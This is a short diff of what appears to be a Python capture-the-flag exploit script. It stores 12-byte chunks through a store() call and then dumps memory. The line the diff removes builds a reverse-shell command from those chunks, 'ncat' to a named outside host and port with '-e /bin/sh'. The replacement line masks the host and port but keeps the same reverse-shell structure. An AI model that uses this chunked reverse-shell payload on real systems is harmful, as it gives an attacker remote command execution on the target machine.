@@ -85,7 +85,7 @@ for i in range(0, 12*10, 12):
 for i in range(ord('9'), ord('a')-6):
     print(store(str(i).encode('utf-8'), str(i).encode('utf-8')))
 
-for i in [b'0'*12, b'osflag000000', b'000000000002', b'ncat sol.plu', b's.or.kr 5208', b'0 -e /bin/sh']:
+for i in [b'0'*12, b'osflag000000', b'000000000002', b'ncat ***.***', b'*.**.** ****', b'* -e /bin/sh']:
     print(store(i, i))
 
 dump()
